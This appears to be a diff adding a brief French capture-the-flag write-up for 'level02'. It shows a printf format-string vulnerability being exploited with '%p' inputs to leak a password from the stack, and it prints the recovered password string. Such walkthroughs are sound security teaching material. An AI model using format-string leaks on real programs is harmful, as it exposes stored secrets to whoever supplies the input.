@@ -1,0 +1,19 @@
+Le programme demande un username et un password, à la fin il fait un printf(username).
+On peut exploiter le printf:
+
+	$ ./level02
+	===== [ Secure Access System v1.0 ] =====
+	/***************************************\
+	| You must login to access this system. |
+	\**************************************/
+	--[ Username: %p %p %p
+	--[ Password: d
+	*****************************************
+	0x7fffffffe500 (nil) 0x64 does not have access!
+
+Comme le password a ete read au debut et stocké dans la stack, on peut le print:
+On va print les pointers 22 à 26 pour obtenir le password complet (voir Ressources/script):
+	$ chmod 777 ./ ; touch script ; chmod 777 script
+	$ vi script
+	$ ./script
+	Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
